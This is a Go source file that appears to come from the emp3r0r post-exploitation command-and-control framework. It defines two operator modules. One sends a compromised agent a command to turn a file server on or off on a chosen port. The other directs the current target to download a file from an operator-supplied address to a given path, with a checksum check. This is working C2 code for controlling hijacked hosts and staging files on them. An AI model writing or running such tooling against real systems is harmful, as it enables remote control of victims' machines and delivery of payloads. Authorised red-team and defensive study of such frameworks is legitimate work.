package modules

import (
	"fmt"

	"github.com/jm33-m0/emp3r0r/core/lib/cc/internal/agents"
	"github.com/jm33-m0/emp3r0r/core/lib/cc/internal/def"
	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

func moduleFileServer() {
	switchOpt, ok := def.AvailableModuleOptions["switch"]
	if !ok {
		logging.Errorf("Option 'switch' not found")
		return
	}
	server_switch := switchOpt.Val

	portOpt, ok := def.AvailableModuleOptions["port"]
	if !ok {
		logging.Errorf("Option 'port' not found")
		return
	}
	cmd := fmt.Sprintf("%s --port %s --switch %s", emp3r0r_def.C2CmdFileServer, portOpt.Val, server_switch)
	err := agents.SendCmd(cmd, "", def.ActiveAgent)
	if err != nil {
		logging.Errorf("SendCmd: %v", err)
		return
	}
	logging.Infof("File server (port %s) is now %s", portOpt.Val, server_switch)
}

func moduleDownloader() {
	requiredOptions := []string{"download_addr", "checksum", "path"}
	for _, opt := range requiredOptions {
		if _, ok := def.AvailableModuleOptions[opt]; !ok {
			logging.Errorf("Option '%s' not found", opt)
			return
		}
	}

	download_addr := def.AvailableModuleOptions["download_addr"].Val
	checksum := def.AvailableModuleOptions["checksum"].Val
	path := def.AvailableModuleOptions["path"].Val

	cmd := fmt.Sprintf("%s --download_addr %s --checksum %s --path %s", emp3r0r_def.C2CmdFileDownloader, download_addr, checksum, path)
	err := agents.SendCmdToCurrentTarget(cmd, "")
	if err != nil {
		logging.Errorf("SendCmd: %v", err)
		return
	}
}
